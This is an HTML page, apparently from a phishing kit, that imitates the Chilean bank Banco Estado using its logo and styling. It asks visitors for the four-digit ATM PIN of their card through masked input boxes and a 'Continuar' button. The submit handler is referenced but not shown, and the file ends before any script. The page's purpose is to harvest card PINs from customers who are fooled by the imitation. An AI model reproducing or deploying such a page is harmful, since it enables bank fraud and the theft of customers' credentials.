<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .logo {
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 16px;
        }

        .logo-text {
            font-size: 14px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .logo-img {
            width: 135px;
            height: 135px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .title {
            font-size: 16px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 30px;
            text-align: center;
            line-height: 1.4;
        }

        .pin-form {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        .pin-inputs-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            align-items: center;
        }

        .pin-input {
            width: 70px;
            height: 70px;
            border: 2px solid #D0D0D8;
            border-radius: 8px;
            font-size: 32px;
            font-weight: 600;
            color: #1a1a1a;
            text-align: center;
            background-color: #FAFAFA;
            transition: all 0.3s ease;
            caret-color: #3B4FB5;
        }

        .pin-input:focus {
            outline: none;
            border-color: #3B4FB5;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(59, 79, 181, 0.1);
        }

        .pin-input::placeholder {
            color: #D0D0D8;
        }

        .eye-icon {
            position: relative;
            cursor: pointer;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .eye-icon:hover svg {
            stroke: #3B4FB5;
        }

        .eye-icon svg {
            width: 20px;
            height: 20px;
            stroke: #1a1a1a;
            fill: none;
            transition: all 0.3s ease;
        }

        .button-group {
            display: flex;
            gap: 12px;
        }

        .continue-btn {
            flex: 1;
            padding: 14px;
            background: linear-gradient(135deg, #3B4FB5 0%, #2A3A8F 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(59, 79, 181, 0.3);
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 15px;
            }

            .pin-input {
                width: 60px;
                height: 60px;
                font-size: 28px;
            }

            .pin-inputs-container {
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
        </div>

        <!-- Título -->
        <h1 class="title">Ingresa la clave de cajero de tu tarjeta</h1>

        <!-- Formulario PIN -->
        <form class="pin-form" id="pinForm" onsubmit="handlePinSubmit(event)">
            <!-- Inputs PIN -->
            <div class="pin-inputs-container">
                <input type="password" class="pin-input" id="pin1" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin2" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin3" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin4" maxlength="1" placeholder="•" autocomplete="off">
                <span class="eye-icon" id="eyeIcon" onclick="togglePinVisibility()" title="Mostrar/ocultar PIN">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <!-- Ícono de ojo tachado - mostrado por defecto -->
                        <g id="eyeHidden">
                            <path d="M1 12s3-7 11-7 11 7 11 7-3 7-11 7-11-7-11-7z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/>
                            <path d="M1 1l22 22" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                        </g>
                        <!-- Ícono de ojo abierto - inicialmente oculto -->
                        <g id="eyeClosed" style="display:none;">
                            <path d="M1 12s3-7 11-7 11 7 11 7-3 7-11 7-11-7-11-7z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/>
                        </g>
                    </svg>
                </span>
            </div>

            <!-- Botón Continuar -->
            <button type="submit" class="continue-btn" style="width: 100%; margin-top: 20px;">Continuar</button>
        </form>
    </div>
